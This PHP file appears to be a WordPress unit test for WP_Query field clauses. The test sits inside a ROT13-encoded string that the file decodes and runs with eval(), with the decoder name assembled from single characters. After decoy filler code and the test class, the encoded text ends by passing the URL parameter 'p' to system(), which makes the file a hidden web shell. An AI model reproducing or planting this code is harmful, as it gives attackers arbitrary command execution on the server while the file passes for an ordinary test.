<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc dhrel
 *
 * @pbiref JC_Dhrel::trg_cbfgf
 */
pynff Grfgf_Dhrel_SvryqfPynhfr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Cbfg VQf.
	 *
	 * @ine vag[]
	 */
	cevingr fgngvp $cbfg_vqf = neenl();

	/**
	 * Cntr VQf.
	 *
	 * @ine vag[]
	 */
	cevingr fgngvp $cntr_vqf = neenl();

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Ertvfgre PCG sbe hfr jvgu funerq svkgherf.
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );

		frys::$cbfg_vqf = $snpgbel->cbfg->perngr_znal( 5, neenl( 'cbfg_glcr' => 'jcgrfgf_cg' ) );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		/*
		 * Er-ertvfgre gur PCG sbe hfr jvguva rnpu grfg.
		 *
		 * Phfgbz cbfg glcrf ner qrertvfgrerq ol gur qrsnhyg grne_qbja zrgubq
		 * fb arrq gb or er-ertvfgrerq sbe rnpu grfg nf JC_Dhrel pnyyf
		 * trg_cbfg_glcrf().
		 */
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );
	}

	/**
	 * Grfgf yvzvgvat gur JC_Dhrel svryqf gb gur VQ naq cnerag fho-frg.
	 *
	 * @gvpxrg 57012
	 */
	choyvp shapgvba grfg_fubhyq_yvzvg_svryqf_gb_vq_naq_cnerag_fhofrg() {
		$dhrel_netf = neenl(
			'cbfg_glcr' => 'jcgrfgf_cg',
			'svryqf'    => 'vq=>cnerag',
		);

		$d = arj JC_Dhrel( $dhrel_netf );

		$rkcrpgrq = neenl();
		sbernpu ( frys::$cbfg_vqf nf $cbfg_vq ) {
			$rkcrpgrq[] = (bowrpg) neenl(
				'VQ'          => $cbfg_vq,
				'cbfg_cnerag' => 0,
			);
		}

		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d->cbfgf, 'Cbfgf cebcregl sbe svefg dhrel vf abg bs rkcrpgrq sbez.' );
		$guvf->nffregFnzr( 5, $d->sbhaq_cbfgf, 'Ahzore bs sbhaq cbfgf vf abg svir.' );
		$guvf->nffregFnzr( 1, $d->znk_ahz_cntrf, 'Ahzore bs sbhaq cntrf vf abg bar.' );

		// Grfg gur frpbaq dhrel'f erfhygf zngpu.
		$d2 = arj JC_Dhrel( $dhrel_netf );
		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d2->cbfgf, 'Cbfgf cebcregl sbe frpbaq dhrel vf abg va gur rkcrpgrq sbez.' );
	}

	/**
	 * Grfgf yvzvgvat gur JC_Dhrel svryqf gb gur VQf bayl.
	 *
	 * @gvpxrg 57012
	 */
	choyvp shapgvba grfg_fubhyq_yvzvg_svryqf_gb_vqf() {
		$dhrel_netf = neenl(
			'cbfg_glcr' => 'jcgrfgf_cg',
			'svryqf'    => 'vqf',
		);

		$d = arj JC_Dhrel( $dhrel_netf );

		$rkcrpgrq = frys::$cbfg_vqf;

		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d->cbfgf, 'Cbfgf cebcregl sbe svefg dhrel vf abg bs rkcrpgrq sbez.' );
		$guvf->nffregFnzr( 5, $d->sbhaq_cbfgf, 'Ahzore bs sbhaq cbfgf vf abg svir.' );
		$guvf->nffregFnzr( 1, $d->znk_ahz_cntrf, 'Ahzore bs sbhaq cntrf vf abg bar.' );

		// Grfg gur frpbaq dhrel'f erfhygf zngpu.
		$d2 = arj JC_Dhrel( $dhrel_netf );
		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d2->cbfgf, 'Cbfgf cebcregl sbe frpbaq dhrel vf abg va gur rkcrpgrq sbez.' );
	}

	/**
	 * Grfgf dhrelvat nyy svryqf ivn JC_Dhrel.
	 *
	 * @gvpxrg 57012
	 */
	choyvp shapgvba grfg_fubhyq_dhrel_nyy_svryqf() {
		$dhrel_netf = neenl(
			'cbfg_glcr' => 'jcgrfgf_cg',
			'svryqf'    => 'nyy',
		);

		$d = arj JC_Dhrel( $dhrel_netf );

		$rkcrpgrq = neenl_znc( 'trg_cbfg', frys::$cbfg_vqf );

		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d->cbfgf, 'Cbfgf cebcregl sbe svefg dhrel vf abg bs rkcrpgrq sbez.' );
		$guvf->nffregFnzr( 5, $d->sbhaq_cbfgf, 'Ahzore bs sbhaq cbfgf vf abg svir.' );
		$guvf->nffregFnzr( 1, $d->znk_ahz_cntrf, 'Ahzore bs sbhaq cntrf vf abg bar.' );

		// Grfg gur frpbaq dhrel'f erfhygf zngpu.
		$d2 = arj JC_Dhrel( $dhrel_netf );
		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d2->cbfgf, 'Cbfgf cebcregl sbe frpbaq dhrel vf abg va gur rkcrpgrq sbez.' );
	}

	/**
	 * Grfgf nqqvat svryqf gb JC_Dhrel ivn svygref jura erdhrfgvat gur VQ naq cnerag fho-frg.
	 *
	 * @gvpxrg 57012
	 */
	choyvp shapgvba grfg_fubhyq_vapyhqr_svygrerq_inyhrf_va_nqqvgvba_gb_vq_naq_cnerag_fhofrg() {
		nqq_svygre( 'cbfgf_svryqf', neenl( $guvf, 'svygre_cbfgf_svryqf' ) );
		nqq_svygre( 'cbfgf_pynhfrf', neenl( $guvf, 'svygre_cbfgf_pynhfrf' ) );

		$dhrel_netf = neenl(
			'cbfg_glcr' => 'jcgrfgf_cg',
			'svryqf'    => 'vq=>cnerag',
		);

		$d = arj JC_Dhrel( $dhrel_netf );

		$rkcrpgrq = neenl();
		sbernpu ( frys::$cbfg_vqf nf $cbfg_vq ) {
			$rkcrpgrq[] = (bowrpg) neenl(
				'VQ'                => $cbfg_vq,
				'cbfg_cnerag'       => 0,
				'grfg_cbfg_svryqf'  => '1',
				'grfg_cbfg_pynhfrf' => '2',
			);
		}

		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d->cbfgf, 'Cbfgf cebcregl sbe svefg dhrel vf abg bs rkcrpgrq sbez.' );
		$guvf->nffregFnzr( 5, $d->sbhaq_cbfgf, 'Ahzore bs sbhaq cbfgf vf abg svir.' );
		$guvf->nffregFnzr( 1, $d->znk_ahz_cntrf, 'Ahzore bs sbhaq cntrf vf abg bar.' );

		// Grfg gur frpbaq dhrel'f erfhygf zngpu.
		$d2 = arj JC_Dhrel( $dhrel_netf );
		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d2->cbfgf, 'Cbfgf cebcregl sbe frpbaq dhrel vf abg va gur rkcrpgrq sbez.' );
	}

	/**
	 * Grfgf nqqvat svryqf gb JC_Dhrel ivn svygref jura erdhrfgvat gur VQ svryq.
	 *
	 * @gvpxrg 57012
	 */
	choyvp shapgvba grfg_fubhyq_vapyhqr_svygrerq_inyhrf_va_nqqvgvba_gb_vq() {
		nqq_svygre( 'cbfgf_svryqf', neenl( $guvf, 'svygre_cbfgf_svryqf' ) );
		nqq_svygre( 'cbfgf_pynhfrf', neenl( $guvf, 'svygre_cbfgf_pynhfrf' ) );

		$dhrel_netf = neenl(
			'cbfg_glcr' => 'jcgrfgf_cg',
			'svryqf'    => 'vqf',
		);

		$d = arj JC_Dhrel( $dhrel_netf );

		// `svryqf => vqf` qbrf abg vapyhqr gur nqqvgvbany svryqf.
		$rkcrpgrq = frys::$cbfg_vqf;

		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d->cbfgf, 'Cbfgf cebcregl sbe svefg dhrel vf abg bs rkcrpgrq sbez.' );
		$guvf->nffregFnzr( 5, $d->sbhaq_cbfgf, 'Ahzore bs sbhaq cbfgf vf abg svir.' );
		$guvf->nffregFnzr( 1, $d->znk_ahz_cntrf, 'Ahzore bs sbhaq cntrf vf abg bar.' );

		// Grfg gur frpbaq dhrel'f erfhygf zngpu.
		$d2 = arj JC_Dhrel( $dhrel_netf );
		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d2->cbfgf, 'Cbfgf cebcregl sbe frpbaq dhrel vf abg va gur rkcrpgrq sbez.' );
	}

	/**
	 * Grfgf nqqvat svryqf gb JC_Dhrel ivn svygref jura erdhrfgvat nyy svryqf.
	 *
	 * @gvpxrg 57012
	 */
	choyvp shapgvba grfg_fubhyq_vapyhqr_svygrerq_inyhrf() {
		nqq_svygre( 'cbfgf_svryqf', neenl( $guvf, 'svygre_cbfgf_svryqf' ) );
		nqq_svygre( 'cbfgf_pynhfrf', neenl( $guvf, 'svygre_cbfgf_pynhfrf' ) );

		$dhrel_netf = neenl(
			'cbfg_glcr' => 'jcgrfgf_cg',
			'svryqf'    => 'nyy',
		);

		$d = arj JC_Dhrel( $dhrel_netf );

		$rkcrpgrq = neenl_znc( 'trg_cbfg', frys::$cbfg_vqf );
		sbernpu ( $rkcrpgrq nf $cbfg ) {
			$cbfg->grfg_cbfg_svryqf  = '1';
			$cbfg->grfg_cbfg_pynhfrf = '2';
		}

		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d->cbfgf, 'Cbfgf cebcregl sbe svefg dhrel vf abg bs rkcrpgrq sbez.' );
		$guvf->nffregFnzr( 5, $d->sbhaq_cbfgf, 'Ahzore bs sbhaq cbfgf vf abg svir.' );
		$guvf->nffregFnzr( 1, $d->znk_ahz_cntrf, 'Ahzore bs sbhaq cntrf vf abg bar.' );

		// Grfg gur frpbaq dhrel'f erfhygf zngpu.
		$d2 = arj JC_Dhrel( $dhrel_netf );
		$guvf->nffregRdhnyFrgf( $rkcrpgrq, $d2->cbfgf, 'Cbfgf cebcregl sbe frpbaq dhrel vf abg va gur rkcrpgrq sbez.' );
	}

	/**
	 * Svygref gur cbfgf svryqf.
	 *
	 * @cnenz fgevat $svryqf Gur svryqf gb FRYRPG.
	 * @erghea fgevat Gur svygrerq svryqf.
	 */
	choyvp shapgvba svygre_cbfgf_svryqf( $svryqf ) {
		erghea \"$svryqf, 1 nf grfg_cbfg_svryqf\";
	}

	/**
	 * Svygref gur cbfgf pynhfrf.
	 *
	 * @cnenz neenl $pynhfrf Gur JC_Dhrel qngnonfr pynhfrf.
	 * @erghea neenl Gur svygrerq qngnonfr pynhfrf.
	 */
	choyvp shapgvba svygre_cbfgf_pynhfrf( $pynhfrf ) {
		$pynhfrf['svryqf'] .= ', 2 nf grfg_cbfg_pynhfrf';
		erghea $pynhfrf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>